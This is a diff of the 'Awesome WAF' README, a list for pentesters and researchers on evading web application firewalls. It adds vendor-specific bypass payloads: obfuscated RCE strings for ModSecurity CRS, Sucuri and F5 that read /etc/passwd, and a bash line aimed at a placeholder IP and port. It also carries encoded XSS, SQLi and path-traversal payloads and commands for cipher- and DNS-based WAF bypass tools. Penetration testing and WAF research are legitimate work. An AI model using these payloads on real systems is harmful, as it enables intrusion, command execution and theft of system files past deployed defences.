@@ -1,5 +1,5 @@
 # Awesome WAF [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg "Awesome")](https://github.com/0xinfection/awesome-waf)
-> A curated list of awesome WAF stuff. 🔥
+> Everything awesome about web application firewalls (WAFs). 🔥
 >
 > __Foreword:__ This was originally my own collection on WAFs. I am open-sourcing it in the hope that it will be useful for pentesters and researchers out there. You might want to keep this repo on a watch, since it will be updated regularly. "The community just learns from each other." __#SharingisCaring__
 
@@ -2299,7 +2299,6 @@ __Blocked__: `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`
 __Bypassed__: `uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`
 
 __3. Unicode Encoding__  
-- Most modern web-apps support UTF-8 and hence are prone to this method.
 - ASCII characters in unicode encoding encoding provide great variants for bypassing.
 - You can encode entire/part of the payload for obtaining results.
 
@@ -2313,7 +2312,7 @@ __Standard__: `../../etc/passwd`
 __Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
 
 __4. HTML Encoding__
-- Often web apps encode special characters into HTML encoding and render accordingly.
+- Often web apps encode special characters into HTML encoding and render them accordingly.
 - This leads us to basic bypass cases with HTML encoding (numeric/generic).
 
 __Standard__: `"><img src=x onerror=confirm()>`  
@@ -2321,7 +2320,7 @@ __Encoded__: `&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;` (General 
 __Encoded__: `&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;` (Numeric reference)
 
 __5. Mixed Encoding__  
-- WAF rules often tend to filter out a single type of encoding.
+- Sometimes, WAF rules often tend to filter out a specific type of encoding.
 - This type of filters can be bypassed by mixed encoding payloads.
 - Tabs and newlines further add to obfuscation.
 
@@ -2388,6 +2387,7 @@ __Obfuscated__: `<script>+-+-1-+-+alert(1)</script>`
 
 __Standard__: `<BODY onload=alert()>`  
 __Obfuscated__: ```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>```
+> __NOTE:__ The above payload can break the regex parser to cause an exception.
 
 __Standard__: `<a href=javascript;alert()>ClickMe `  
 __Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`
@@ -2437,36 +2437,7 @@ __Obfuscated__:
 <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 ```
 
-__13. Unsupported SSL/TLS Ciphers__
-- Many a times, servers do accept connections from various SSL/TLS ciphers and versions.
-- Using a cipher to initialise a connection to server which is not supported by the WAF can do our workload.
-
-#### Technique:
-- Dig out the ciphers supported by the firewall (usually the WAF vendor documentation discusses this).
-- Find out the ciphers supported by the server (tools like [SSLScan](https://github.com/rbsec/sslscan) helps).
-- If a specific cipher not supported by WAF but by the server, is found, voila!
-- Initiating a new connection to the server with that specific cipher should smuggle our payload in.
-
-> __Tool__: [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf)  
-```
-python abuse-ssl-bypass-waf.py -thread 4 -target <target>
-```
-CLI tools like cURL can come very handy for PoCs:
-```
-curl --ciphers <cipher> -G <test site> -d <payload with parameter>
-``` 
-
-__14. Abusing DNS History__
-- Often old historical DNS records provide information about the location of the site behind the WAF.
-- The target is to get the location of the site, so that we can route our requests directly to the site and not through the WAF.
-> __TIP:__ Some online services like [IP History](http://www.iphistory.ch/en/) and [DNS Trails](https://securitytrails.com/dns-trails) come to the rescue during the recon process.  
-
-__Tool__: [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)
-```
-bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
-```
-
-__15. Other Formats__  
+__13. Obfuscation in Other Formats__  
 - Many web applications support different encoding types and can interpret the encoding (see below).
 - Obfuscating our payload to a format not supported by WAF but the server can smuggle our payload in.
 
@@ -2636,6 +2607,35 @@ An exotic payload example:
 <a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
 ```
 
+### Abusing SSL/TLS Ciphers:
+- Many a times, servers do accept connections from various SSL/TLS ciphers and versions.
+- Using a cipher to initialise a connection to server which is not supported by the WAF can do our workload.
+
+#### Technique:
+- Dig out the ciphers supported by the firewall (usually the WAF vendor documentation discusses this).
+- Find out the ciphers supported by the server (tools like [SSLScan](https://github.com/rbsec/sslscan) helps here).
+- If a specific cipher not supported by WAF but by the server, is found, voila!
+- Initiating a new connection to the server with that specific cipher should smuggle our payload in.
+
+> __Tool__: [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf)  
+```
+python abuse-ssl-bypass-waf.py -thread 4 -target <target>
+```
+CLI tools like cURL can come very handy for PoCs:
+```
+curl --ciphers <cipher> -G <test site> -d <payload with parameter>
+```
+
+### Abusing DNS History:
+- Often old historical DNS records provide information about the location of the site behind the WAF.
+- The target is to get the location of the site, so that we can route our requests directly to the site and not through the WAF.
+> __TIP:__ Some online services like [IP History](http://www.iphistory.ch/en/) and [DNS Trails](https://securitytrails.com/dns-trails) come to the rescue during the recon process.  
+
+__Tool__: [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)
+```
+bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
+```
+
 ### Request Header Spoofing:
 #### Method:
 - The target is to fool the WAF/server into believing it was from their internal network.
@@ -2763,6 +2763,12 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 - XSS Bypass by [@Ahmet Ümit](https://twitter.com/ahmetumitbayram)
 ```
 <--`<img/src=` onerror=confirm``> --!>
+```
+- [RCE Payload Detection Bypass](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+```
+cat$u+/etc$u/passwd$u
+/bin$u/bash$u <ip> <port>
+";cat+/etc/passwd+#
 ```
 
 ### Comodo 
@@ -2926,6 +2932,24 @@ state=%2527+and+
 BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
 ```
 
+### ModSecurity CRS
+- [RCE Payloads Detection Bypass for PL3](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
+```
+;+$u+cat+/etc$u/passwd$u
+```
+- [RCE Payloads Detection Bypass for PL2](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
+```
+;+$u+cat+/etc$u/passwd+\#
+```
+- [RCE Payloads for PL1 and PL2](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.0)
+```
+/???/??t+/???/??ss??
+```
+- [RCE Payloads for PL3](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.0)
+```
+/?in/cat+/et?/passw?
+```
+
 ### Imperva
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
 - XSS Bypass by [@David Y](https://twitter.com/daveysec)
@@ -2935,7 +2959,6 @@ BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
 - XSS Bypass by [@Emad Shanab](https://twitter.com/alra3ees)
 ```
 <svg/onload=self[`aler`%2b`t`]`1`>
-anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 - XSS Bypass by [@WAFNinja](https://waf.ninja)
@@ -2966,7 +2989,7 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
-- XSS Bypass by [0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
 ```
 <abc/onmouseenter=confirm%60%60>
 ```
@@ -2998,6 +3021,17 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 ?<input type="search" onsearch="aler\u0074(1)">
 <details ontoggle=alert(1)>
+```
+
+### Sucuri
+- [Smuggling RCE Payloads through Sucuri](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+```
+/???/??t+/???/??ss??
+```
+- [Obfuscating RCE Payloads](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+```
+;+cat+/e'tc/pass'wd
+c\\a\\t+/et\\c/pas\\swd
 ```
 
 ### WebARX
